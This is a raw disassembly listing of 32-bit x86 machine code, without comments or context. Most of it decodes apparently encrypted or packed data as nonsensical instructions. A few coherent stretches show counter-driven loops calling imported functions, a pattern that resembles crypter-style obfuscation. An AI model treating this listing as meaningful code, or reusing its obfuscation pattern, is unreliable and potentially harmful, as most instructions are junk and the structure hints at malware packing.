  40730e:	xchg   ebx,eax
  40730f:	or     eax,0x6de295c7
  407314:	xor    ebx,ebp
  407316:	data16 repnz loop 0x4072ea
  40731a:	mov    DWORD PTR [eax],esp
  40731c:	cmp    ebp,DWORD PTR [ebp-0x43]
  40731f:	xchg   ecx,eax
  407320:	mov    ds:0xfbe2fbd8,eax
  407325:	xor    al,BYTE PTR [eax-0x6df07e8]
  40732b:	mov    ds:0x492a81e,eax
  407330:	sbb    ch,ah
  407332:	daa    
  407333:	arpl   WORD PTR ds:0x1a790d7c,si
  407339:	mov    dh,0x74
  40733c:	aad    0xaf
  40733e:	test   BYTE PTR [ecx-0x2a],ch
  407341:	sub    eax,0xd00ac239
  407346:	cmc    
  407347:	or     eax,0x27840f5b
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x4337d7,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x4338ab
  40736f:	or     DWORD PTR ds:0x4338af,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x407368
  407387:	adc    al,0x89
  407389:	xchg   ecx,eax
  40738a:	or     al,dl
  40738c:	jle    0x40740c
  40738e:	add    eax,0xb7e7e7c
  407393:	jmp    0x9b18:0xb27cb68
  40739a:	outs   dx,BYTE PTR ds:[esi]
  40739b:	push   cs
  40739c:	fcomp  DWORD PTR [ecx]
  40739e:	adc    eax,0x7cb16fea
  4073a3:	mov    BYTE PTR [edi],dl
  4073a5:	lea    ecx,[ebx]
  4073a7:	or     eax,0xa77e272e
  4073ad:	(bad)  
  4073ae:	jp     0x4073c8
  4073b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073b1:	shr    BYTE PTR [esi+0x2c0ad427],cl
  4073b7:	jp     0x4073c8
  4073b9:	push   esi
  4073ba:	in     al,0x18
  4073bc:	(bad)  
  4073be:	or     BYTE PTR [edx+0x5b],bl
  4073c1:	pusha  
  4073c2:	jnp    0x4073ad
  4073c4:	jmp    0x95568e4a
  4073c9:	push   edx
  4073ca:	je     0x407370
  4073cc:	push   esi
  4073cd:	clc    
  4073ce:	xchg   DWORD PTR [esi-0x74d24520],edx
  4073d4:	gs push esi
  4073d6:	out    dx,al
  4073d7:	es mov al,0x34
  4073da:	popa   
  4073db:	popa   
  4073dc:	mov    ebx,0x8ccd4520
  4073e1:	push   ebx
  4073e2:	mov    ecx,0xf19286e5
  4073e7:	cmp    BYTE PTR [ecx+0x7a],bl
  4073ea:	sbb    BYTE PTR [bp+0x5255],bh
  4073ef:	cmp    BYTE PTR [ebx-0x8],dh
  4073f2:	scas   al,BYTE PTR es:[edi]
  4073f3:	scas   al,BYTE PTR es:[edi]
  4073f4:	mov    ds:0x35bb7b22,al
  4073f9:	std    
  4073fa:	mov    eax,ebx
  4073fc:	lods   eax,DWORD PTR ds:[esi]
  4073fd:	(bad)
  407401:	in     al,0xb5
  407403:	dec    ebp
  407404:	sub    eax,0xd4240b8f
  407409:	lds    eax,FWORD PTR [eax+esi*1-0x443cb49d]
  407410:	inc    ebx
  407411:	dec    eax
  407412:	jb     0x407483
  407414:	retf   
  407415:	cmp    ebx,DWORD PTR [esi]
  407417:	and    BYTE PTR [ebx+ebp*1+0x3],bl
  40741b:	mov    DWORD PTR [ebx-0x15],edi
  40741e:	jbe    0x40742f
  407420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407421:	xchg   DWORD PTR [eax],eax
  407423:	cmp    eax,0x7c14982
  407428:	dec    eax
  407429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40742a:	xchg   edx,eax
  40742b:	cdq    
  40742c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40742d:	push   ebp
  40742e:	and    cl,0x30
  407431:	out    dx,al
  407432:	and    eax,0x7b57e9a4
  407437:	lods   eax,DWORD PTR ds:[esi]
  407438:	icebp  
  407439:	mov    ebp,0x4627a622
  40743e:	mov    eax,0x4c260409
  407443:	jecxz  0x40740f
  407445:	aam    0x8b
  407447:	sub    BYTE PTR [ecx],0xd0
  40744a:	or     eax,0xd3e16fd1
  40744f:	dec    edi
  407450:	mov    eax,ds:0x493bd387
  407455:	dec    edi
  407456:	xchg   edx,eax
  407457:	mov    edx,0xc35674c
  40745c:	xor    ebp,DWORD PTR [ecx-0x7b]
  40745f:	cmp    eax,0xf89c33d9
  407464:	push   ecx
  407465:	add    eax,0x29ca0aa1
  40746a:	out    dx,al
  40746b:	cmp    edx,DWORD PTR [ebp+0x2bcc404e]
  407471:	dec    ecx
  407472:	push   edx
  407473:	pop    edx
  407474:	aad    0xd4
  407476:	dec    ebp
  407477:	ret    0xb4ce
  40747a:	(bad)  
  40747b:	ffree  st(2)
  40747d:	test   eax,0xbc432f3d
  407482:	sub    edi,esp
  407484:	aaa    
  407485:	xor    eax,0x40446719
  40748a:	fbstp  TBYTE PTR [esi]
  40748c:	imul   ecx,DWORD PTR [eax-0x746b00c5],0xffffffdc
  407493:	pop    ss
  407494:	inc    edi
  407495:	adc    al,0xf2
  407497:	in     eax,dx
  407498:	cmp    DWORD PTR [ecx+0x68],0xffffff98
  40749c:	push   ds
  40749d:	jl     0x407468
  40749f:	rcl    BYTE PTR [ebp+0x68],cl
  4074a2:	rcr    eax,0x1c
  4074a5:	mov    ds:0x692356a3,al
  4074aa:	cmc    
  4074ab:	jle    0x4074a6
  4074ad:	ss or  eax,0x874edaf4
  4074b3:	sbb    al,0x10
  4074b5:	shr    DWORD PTR [eax+0x38],0x8
  4074b9:	(bad)  
  4074ba:	gs hlt 
  4074bc:	jg     0x407460
  4074be:	out    0xbb,eax
  4074c0:	mov    al,ds:0x740f8578
  4074c5:	popf   
  4074c6:	(bad)  
  4074c7:	cmp    BYTE PTR [edx-0x41],bl
  4074ca:	jmp    0x40746d
  4074cc:	aam    0x21
  4074ce:	leave  
  4074cf:	je     0x40754b
  4074d1:	jae    0x407507
  4074d3:	ss bnd jo 0x4074e1
  4074d7:	fwait
  4074d8:	lea    esi,[ebp+ecx*8+0x2b]
  4074dc:	cld    
  4074dd:	test   eax,0xa5c6565d
  4074e2:	fst    DWORD PTR [edi-0x50]
  4074e5:	sub    BYTE PTR ds:0xfdd9aa17,0xc2
  4074ec:	xor    DWORD PTR [ecx-0x1cd07c40],edx
  4074f2:	add    bh,al
  4074f4:	imul   eax,DWORD PTR [edx-0x3dccd054],0x745ef5e
  4074fe:	retf   
  4074ff:	fdivr  st,st(3)
  407501:	xchg   esi,eax
  407502:	lods   al,BYTE PTR ds:[esi]
  407503:	hlt    
  407504:	nop
  407505:	add    edx,DWORD PTR [ebx+0x9]
  407508:	gs sub bh,0xd5
  40750c:	mov    edi,0xd8438e04
  407511:	push   ss
  407512:	fcmovnu st,st(7)
  407514:	lea    esi,[ecx+0x3a]
  407517:	xor    al,0x7a
  407519:	(bad)
  40751d:	fist   DWORD PTR [edi-0x17]
  407520:	sub    al,0xc
  407522:	fimul  WORD PTR [esi+edx*8-0x57]
  407526:	inc    esi
  407527:	jb     0x407566
  407529:	fdiv   st(4),st
  40752b:	test   al,0x3c
  40752d:	jg     0x407559
  40752f:	sbb    al,BYTE PTR [ebp+eax*8+0x34b2c66a]
  407536:	out    dx,al
  407537:	jmp    0x897262f5
  40753c:	bound  eax,QWORD PTR [ebx+edx*1-0xe8c5059]
  407543:	outs   dx,BYTE PTR ds:[esi]
  407544:	ret    0x35a3
  407547:	loop   0x407571
  407549:	ficomp DWORD PTR [edi]
  40754b:	ret    
  40754c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40754d:	mov    bh,0x1e
  40754f:	push   ebp
  407550:	sti    
  407551:	cli    
  407552:	mov    ds:0xdac3af66,eax
  407557:	inc    edx
  407558:	mov    edx,eax
  40755a:	(bad)  
  40755c:	in     al,0x62
  40755e:	shl    DWORD PTR [ebx+0x5e219181],cl
  407564:	dec    ecx
  407565:	outs   dx,BYTE PTR fs:[esi]
  407567:	pop    ds
  407568:	cmp    eax,0x29addb60
  40756d:	pop    eax
  40756e:	jnp    0x4075be
  407570:	sub    dh,BYTE PTR [ecx-0x11]
  407573:	imul   edx,DWORD PTR es:0x507cfb4d,0x5
  40757b:	jbe    0x4075a8
  40757d:	sub    eax,0x39a5d362
  407582:	mov    al,0x86
  407584:	lods   al,BYTE PTR ds:[esi]
  407585:	pcmpgtb mm3,QWORD PTR ds:0x7ebc5e3b
  40758c:	pop    ebp
  40758d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40758e:	je     0x40759f
  407590:	or     dh,BYTE PTR [edx-0x5]
  407593:	adc    DWORD PTR [ebx+0x3d],0x8332385a
  40759a:	minps  xmm4,xmm2
  40759d:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4075a4:	xor    eax,0x551
  4075a9:	mov    eax,0x9577
  4075ae:	mov    ecx,DWORD PTR ds:0x4337d3
  4075b4:	sub    DWORD PTR ds:0x43378f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x43377f
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x4337eb,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43378f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43378f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43378f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43378f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43378f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	loopne 0x4076b9
  407657:	xchg   esp,eax
  407658:	fs adc eax,eax
  40765b:	jle    0x4076db
  40765d:	add    eax,0xb47e7e7c
  407662:	repz pop ds
  407664:	rol    BYTE PTR [ebp+esi*4-0x21f40736],1
  40766b:	std    
  40766c:	icebp  
  40766d:	xor    al,0x68
  40766f:	nop
  407670:	(bad)  
  407671:	shl    DWORD PTR [ecx-0x80],1
  407674:	(bad)  
  407675:	jno    0x40765e
  407677:	mov    edx,DWORD PTR [edi+0x33]
  40767a:	mov    eax,DWORD PTR [ecx]
  40767c:	pop    ebp
  40767d:	fmul   QWORD PTR [ecx]
  40767f:	sbb    bh,BYTE PTR [ebx]
  407681:	jne    0x4076b6
  407683:	fadd   DWORD PTR [edx]
  407685:	cmp    edi,DWORD PTR [ebx+0x5f780fce]
  40768b:	sti    
  40768c:	imul   DWORD PTR [eax+0x73]
  40768f:	or     dl,0xc9
  407692:	mov    al,ds:0xcaeac664
  407697:	(bad)  
  407698:	mov    ss,edx
  40769a:	fild   DWORD PTR [edi-0x7c6a0c63]
  4076a0:	jbe    0x4076e3
  4076a2:	lods   eax,DWORD PTR ss:[esi]
  4076a4:	imul   ebp,DWORD PTR [eax],0x66
  4076a7:	loop   0x40762f
  4076a9:	(bad)  
  4076aa:	aam    0xaf
  4076ac:	stos   BYTE PTR es:[edi],al
  4076ad:	(bad)  
  4076ae:	sbb    bh,ch
  4076b0:	arpl   WORD PTR [edx+0x28],dx
  4076b3:	add    DWORD PTR [ecx+0x50],esi
  4076b6:	iret   
  4076b7:	inc    edi
  4076b8:	xchg   ebp,eax
  4076b9:	pop    ds
  4076ba:	push   ds
  4076bb:	int    0x1f
  4076bd:	jle    0x40768c
  4076bf:	ss sub eax,0x399c2a0d
  4076c5:	push   0x3a35adf
  4076ca:	lods   eax,DWORD PTR ds:[esi]
  4076cb:	jo     0x4076aa
  4076cd:	pushf  
  4076ce:	(bad)  
  4076cf:	loop   0x4076ae
  4076d1:	xchg   ebx,eax
  4076d2:	and    DWORD PTR [ebx-0x3d],ebp
  4076d5:	pop    edx
  4076d6:	push   ebp
  4076d7:	loopne 0x407664
  4076d9:	ins    DWORD PTR es:[edi],dx
  4076da:	stos   BYTE PTR es:[edi],al
  4076db:	icebp  
  4076dc:	mul    DWORD PTR [ecx*1+0x2d12942a]
  4076e3:	xchg   ebp,eax
  4076e4:	jmp    0x40774f
  4076e6:	or     al,BYTE PTR [ecx-0x5e]
  4076e9:	sbb    BYTE PTR [esi-0x9377c76],ah
  4076ef:	cmp    DWORD PTR [ebp-0x39],ebx
  4076f2:	inc    ebp
  4076f3:	lods   al,BYTE PTR ds:[esi]
  4076f4:	fs pop ecx
  4076f6:	jmp    0xf1d37f34
  4076fb:	ror    DWORD PTR [edx+0xe],cl
  4076fe:	(bad)  
  4076ff:	(bad)  
  407700:	pop    edi
  407701:	in     eax,dx
  407702:	cmp    dh,ah
  407704:	dec    ecx
  407705:	arpl   cx,bx
  407707:	or     eax,0x77d343eb
  40770c:	mul    DWORD PTR [edx-0x79]
  40770f:	xor    ah,bl
  407711:	les    edx,FWORD PTR [bx+di-0x6eb8]
  407716:	jb     0x4076b3
  407718:	push   ecx
  407719:	sub    DWORD PTR [edi],esp
  40771b:	or     bl,BYTE PTR [edi]
  40771d:	not    DWORD PTR [ebp+0x7a]
  407720:	and    ebx,DWORD PTR [esi-0x2853cdc4]
  407726:	cmp    bl,bh
  407728:	icebp  
  407729:	push   ecx
  40772a:	push   ebp
  40772b:	dec    edi
  40772c:	ret    
  40772d:	cld    
  40772e:	xor    eax,DWORD PTR [ecx-0x45]
  407731:	jl     0x407713
  407733:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407734:	mov    edx,0xf4df0edf
  407739:	xor    eax,0xdb810701
  40773e:	push   ss
  40773f:	mov    ah,0xf0
  407741:	rol    bh,1
  407743:	dec    edi
  407744:	bound  esi,QWORD PTR [edx-0x79]
  407747:	(bad)  
  407749:	push   esi
  40774a:	out    0xe6,al
  40774c:	out    0x87,al
  40774e:	xchg   esp,eax
  40774f:	fidivr WORD PTR [ebx+edi*8+0x62d55f88]
  407756:	and    ch,bh
  407758:	je     0x407714
  40775a:	les    esi,FWORD PTR [ebx+0x105669de]
  407760:	sub    dl,BYTE PTR [ebx+eiz*4-0x49fdeee0]
  407767:	lods   al,BYTE PTR ds:[esi]
  407768:	icebp  
  407769:	sbb    DWORD PTR [edx+0x7a],esp
  40776c:	cwde   
  40776d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40776e:	leave  
  40776f:	je     0x407738
  407771:	dec    ebp
  407772:	mov    BYTE PTR [esp+ecx*2+0x15],dl
  407776:	mov    esi,0x3e6a022c
  40777b:	arpl   WORD PTR [edi],bp
  40777d:	(bad)
  407780:	xlat   BYTE PTR ds:[ebx]
  407781:	daa    
  407782:	(bad)  
  407783:	or     DWORD PTR [edi],ecx
  407785:	or     al,0x27
  407787:	test   bl,cl
  407789:	and    eax,0xf30a9551
  40778e:	sbb    cl,BYTE PTR [edi+0x2de336c7]
  407794:	fs sbb al,0xf6
  407797:	mov    BYTE PTR [ebx+0x36a62b90],bh
  40779d:	cmp    eax,0x3db621c0
  4077a2:	cwde   
  4077a3:	sub    ecx,esi
  4077a5:	jne    0x40781d
  4077a7:	out    dx,eax
  4077a8:	and    ebp,ecx
  4077aa:	pop    es
  4077ab:	cmp    ah,BYTE PTR [edx+0x6dba3a32]
  4077b1:	mov    esi,0x97e930e8
  4077b6:	sub    BYTE PTR [edx+0x5ed31908],ah
  4077bc:	push   ebx
  4077bd:	test   dl,ch
  4077bf:	inc    ebx
  4077c0:	mov    ebx,0x85d8df08
  4077c5:	es cwde 
  4077c7:	(bad)  
  4077c8:	nop
  4077c9:	inc    ecx
  4077ca:	push   ebx
  4077cb:	xchg   ecx,eax
  4077cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077cd:	mov    dh,0xa0
  4077cf:	jo     0x407802
  4077d1:	inc    edx
  4077d2:	(bad)  
  4077d3:	xor    DWORD PTR ds:0x2993bf12,esp
  4077d9:	pushf  
  4077da:	mov    edx,0xd5514422
  4077df:	popf   
  4077e0:	icebp  
  4077e1:	mov    bl,0x5b
  4077e3:	xor    eax,0xf871987a
  4077e8:	xor    al,0xc5
  4077ea:	mov    ecx,0xea5fcdb3
  4077ef:	or     ch,BYTE PTR [edi+0x14]
  4077f2:	mov    ebx,ebx
  4077f4:	dec    esp
  4077f5:	mov    WORD PTR [edi],fs
  4077f7:	jmp    0x407798
  4077f9:	outs   dx,DWORD PTR ds:[esi]
  4077fa:	in     al,0xfe
  4077fc:	adc    ebp,ecx
  4077fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077ff:	xchg   ebp,eax
  407800:	cwde   
  407801:	xor    BYTE PTR [eax],cl
  407803:	or     dh,BYTE PTR [eax-0x6e0b1e47]
  407809:	outs   dx,DWORD PTR ds:[esi]
  40780a:	jb     0x407856
  40780c:	outs   dx,DWORD PTR ds:[esi]
  40780d:	push   ds
  40780e:	cmp    ecx,DWORD PTR [edx]
  407810:	lea    ebx,[edi-0x246f5cea]
  407816:	push   cs
  407817:	add    eax,0x57a4e97c
  40781c:	jns    0x40779f
  40781e:	add    ebx,0x82b75628
  407824:	push   0x26
  407826:	outs   dx,DWORD PTR ds:[esi]
  407827:	js     0x407814
  407829:	sub    al,BYTE PTR [esi]
  40782b:	xor    eax,0x66aa917a
  407830:	jmp    0x4077ed
  407832:	cmp    al,0xe
  407834:	or     eax,0xf7d33d88
  407839:	inc    ebp
  40783a:	mov    bh,0xc
  40783c:	mov    ecx,0x888d5089
  407841:	inc    esp
  407842:	or     dl,0xfd
  407845:	das    
  407846:	push   cs
  407847:	xchg   esi,eax
  407848:	add    esp,DWORD PTR [eax+0x13]
  40784b:	xor    al,0xbc
  40784d:	lods   al,BYTE PTR ds:[esi]
  40784e:	les    ebp,FWORD PTR [edi]
  407850:	dec    edi
  407851:	jmp    0x407877
  407853:	sti    
  407854:	(bad)  
  407855:	call   0x8541a72e
  40785a:	push   es
  40785b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40785c:	ins    DWORD PTR es:[edi],dx
  40785d:	sub    eax,0x84d9e54e
  407862:	add    BYTE PTR [ebx-0x1c],0xe8
  407866:	jmp    0x5644:0xa23112e0
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x43377f,0x4337e3
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43389b,0x12
  40788b:	cmp    DWORD PTR ds:0x43389b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43389b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43389b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43389b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43381f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43381f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43381f,esi
  4078e0:	cmp    DWORD PTR ds:0x43381f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43381f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x22,eax
  407922:	add    esi,DWORD PTR [esi+0x7ece24e6]
  407928:	jle    0x40792f
  40792a:	jl     0x4079aa
  40792c:	jle    0x4078e6
  40792e:	jg     0x4078b9
  407930:	scas   al,BYTE PTR es:[edi]
  407931:	sub    cl,al
  407933:	stos   BYTE PTR es:[edi],al
  407934:	test   DWORD PTR [ebp-0x640d012b],eax
  40793a:	adc    al,0xbc
  40793c:	fcom   QWORD PTR [ecx]
  40793e:	cld    
  40793f:	or     DWORD PTR [esi+0x676353ef],esi
  407945:	pop    ds
  407946:	into   
  407947:	stos   BYTE PTR es:[edi],al
  407948:	call   0x7232:0xbef694ea
  40794f:	dec    ebx
  407950:	sahf   
  407951:	xchg   DWORD PTR [eax],edi
  407953:	xchg   ebx,eax
  407954:	ss mov al,0xae
  407957:	hlt    
  407958:	call   0x7d4e:0xd1c0d270
  40795f:	add    al,0x45
  407961:	test   al,0x5e
  407963:	scas   al,BYTE PTR es:[edi]
  407964:	fstp   QWORD PTR [eax-0x7a]
  407967:	or     esp,DWORD PTR [esi+edi*2]
  40796a:	cmc    
  40796b:	push   ebx
  40796c:	fisttp WORD PTR [ebp+0xff21b28]
  407972:	push   ecx
  407973:	jo     0x40796a
  407975:	sub    eax,0xbd92d36a
  40797a:	arpl   WORD PTR [eax+ebp*2],bx
  40797d:	adc    eax,0x7410bd8e
  407982:	mov    al,ds:0x68bfdbd4
  407987:	push   ecx
  407988:	xchg   esp,eax
  407989:	jmp    0xe2387da
  40798e:	inc    edx
  40798f:	test   DWORD PTR [ecx+0x3ef8ad73],esi
  407995:	mov    cl,0x74
  407997:	iret   
  407998:	outs   dx,DWORD PTR ds:[esi]
  407999:	mov    ebx,0x18cb9eda
  40799e:	inc    ebp
  40799f:	shl    bl,0xf6
  4079a2:	sbb    edi,DWORD PTR [eax]
  4079a4:	fsubr  QWORD PTR [ebx]
  4079a6:	add    bl,al
  4079a8:	mov    ecx,gs
  4079aa:	inc    edi
  4079ab:	sub    BYTE PTR [ecx+ebp*2+0x45],bh
  4079af:	rcr    BYTE PTR [eax+ecx*4],0xdd
  4079b3:	popf   
  4079b4:	pop    es
  4079b5:	ds ds xor al,0x2a
  4079b9:	jg     0x4079bd
  4079bb:	cmp    ebp,edi
  4079bd:	xchg   esp,eax
  4079be:	test   eax,0xaff0fdcf
  4079c3:	test   eax,0x77684ba8
  4079c8:	mov    ah,0x7b
  4079ca:	ret    
  4079cb:	adc    DWORD PTR [bp+di+0x46],eax
  4079cf:	rcr    al,0xf7
  4079d2:	scas   al,BYTE PTR es:[edi]
  4079d3:	mov    ah,0xd
  4079d5:	cs mov ebx,0xfb67d3af
  4079db:	lahf   
  4079dc:	aad    0x54
  4079de:	cmc    
  4079df:	cli    
  4079e0:	xlat   BYTE PTR ds:[ebx]
  4079e1:	jnp    0x40797c
  4079e3:	add    al,0xc3
  4079e5:	icebp  
  4079e6:	bound  eax,QWORD PTR [eax+edi*8+0x68]
  4079ea:	mov    bh,0xdd
  4079ec:	and    DWORD PTR [ebp+0x2191433b],ebp
  4079f2:	jp     0x4079df
  4079f4:	shr    DWORD PTR [ebp+0x45],0x71
  4079f8:	daa    
  4079f9:	push   ecx
  4079fa:	sbb    eax,0xe7bd3180
  4079ff:	pop    ebx
  407a00:	adc    dl,bl
  407a02:	mov    al,0x7a
  407a04:	mov    ebx,0x8a598643
  407a09:	ds lahf 
  407a0b:	mov    ?,WORD PTR [eax-0x76846dda]
  407a11:	pop    esi
  407a12:	loop   0x4079aa
  407a14:	ds in  al,0xba
  407a17:	xor    al,BYTE PTR [esp+esi*4]
  407a1a:	rcr    BYTE PTR [ebp-0x7615f79a],1
  407a20:	leave  
  407a21:	scas   eax,DWORD PTR es:[edi]
  407a22:	mov    DWORD PTR [edi-0x22650657],esi
  407a28:	push   edx
  407a29:	fmulp  st(2),st
  407a2b:	sub    al,BYTE PTR [ebp+0x5f]
  407a2e:	pop    esp
  407a2f:	shl    bl,cl
  407a31:	pop    esp
  407a32:	pop    es
  407a33:	mov    dl,0xf3
  407a35:	stc    
  407a36:	stc    
  407a37:	out    0x5a,al
  407a39:	jae    0x4079c2
  407a3b:	push   esi
  407a3c:	pop    esp
  407a3d:	sbb    esi,edi
  407a3f:	mov    eax,ds:0x440aa5ce
  407a44:	cmp    DWORD PTR [esi-0x427db2ad],edx
  407a4a:	addr16 popa 
  407a4c:	ret    0x229c
  407a4f:	adc    ebp,DWORD PTR [ebx+0x38f445b9]
  407a55:	shr    bh,0xc6
  407a58:	jns    0x407a85
  407a5a:	std    
  407a5b:	dec    edi
  407a5c:	stc    
  407a5d:	ins    BYTE PTR es:[edi],dx
  407a5e:	add    ecx,eax
  407a60:	in     eax,dx
  407a61:	and    BYTE PTR [edx+0x26],cl
  407a64:	xchg   esi,eax
  407a65:	stos   BYTE PTR es:[edi],al
  407a66:	pop    esi
  407a67:	inc    eax
  407a68:	int    0x8d
  407a6a:	xor    eax,0x4ef4cb06
  407a6f:	in     al,0x4
  407a71:	adc    dh,bl
  407a73:	in     al,0x8d
  407a75:	mov    dh,0xd8
  407a77:	lock daa 
  407a79:	add    bh,BYTE PTR [ebx-0x2e3072d6]
  407a7f:	popa   
  407a80:	mov    cl,0xa3
  407a82:	dec    ecx
  407a83:	jbe    0x407ae4
  407a85:	jge    0x407a0c
  407a87:	mov    al,ds:0x419237af
  407a8c:	hlt    
  407a8d:	repnz mov ch,0x2f
  407a90:	push   es
  407a91:	(bad)  
  407a92:	fisub  WORD PTR [edx-0x4b]
  407a95:	inc    eax
  407a96:	stos   DWORD PTR es:[edi],eax
  407a97:	sub    ecx,DWORD PTR [edi-0x14]
  407a9a:	mov    cl,0xce
  407a9c:	retf   0x7828
  407a9f:	int3   
  407aa0:	call   0xbbf6:0xf43d7dd9
  407aa7:	mov    ebp,0x48ae4df3
  407aac:	pusha  
  407aad:	mov    eax,0x5f60df95
  407ab2:	push   0x8b2723c3
  407ab7:	fwait
  407ab8:	loope  0x407ab6
  407aba:	sbb    ebp,DWORD PTR [ebx-0x9b93a7c]
  407ac0:	push   ebx
  407ac1:	pop    ebx
  407ac2:	xor    BYTE PTR [ebp+0x6c],0x76
  407ac6:	(bad)  
  407ac7:	sub    ebp,edx
  407ac9:	dec    edx
  407aca:	xor    al,0x8f
  407acc:	inc    eax
  407acd:	cmp    BYTE PTR [ebp+0x5ae79a04],dl
  407ad3:	and    eax,0x1b20246a
  407ad8:	scas   al,BYTE PTR es:[edi]
  407ad9:	inc    edi
  407ada:	aam    0x5d
  407adc:	adc    BYTE PTR [eax],bl
  407ade:	jmp    0xab1f:0x673eeb8a
  407ae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ae6:	push   ebp
  407ae7:	xchg   edx,eax
  407ae8:	jbe    0x407acb
  407aea:	loop   0x407b29
  407aec:	ins    BYTE PTR es:[edi],dx
  407aed:	outs   dx,BYTE PTR ds:[esi]
  407aee:	shl    DWORD PTR [ebx-0x33],0x6d
  407af2:	cmp    edx,ecx
  407af4:	in     eax,0x72
  407af6:	loop   0x407a7f
  407af8:	ss pop ds
  407afa:	lahf   
  407afb:	repz enter 0x20b2,0x40
  407b00:	or     al,0x3f
  407b02:	imul   ch
  407b04:	out    0x45,eax
  407b06:	push   ebx
  407b07:	mov    eax,ds:0x2cca0b99
  407b0c:	ins    DWORD PTR es:[edi],dx
  407b0d:	int3   
  407b0e:	(bad)  
  407b0f:	es xchg esp,eax
  407b11:	pop    ecx
  407b12:	cli    
  407b13:	mov    edi,0x1dbb51fd
  407b18:	into   
  407b19:	into   
  407b1a:	out    0x94,eax
  407b1c:	arpl   WORD PTR [ebp-0x65],si
  407b1f:	or     eax,0x132ac53b
  407b24:	in     al,0x7d
  407b26:	or     eax,0xc665c0fd
  407b2b:	(bad)  [edx-0x40bf3b3]
  407b31:	pop    esi
  407b32:	sbb    al,dl
  407b34:	xor    BYTE PTR [esi+0x4a],bh
  407b37:	add    al,0x33
  407b39:	rol    DWORD PTR [ecx+0x43382b15],0x0
  407b40:	outs   dx,BYTE PTR ds:[esi]
  407b41:	sbb    al,0x0
  407b43:	add    BYTE PTR [esi+0x32729b],bh
  407b49:	mov    DWORD PTR ds:0x4337d3,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433787,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x4338af,0x43378f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43381f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433783
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x433827,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
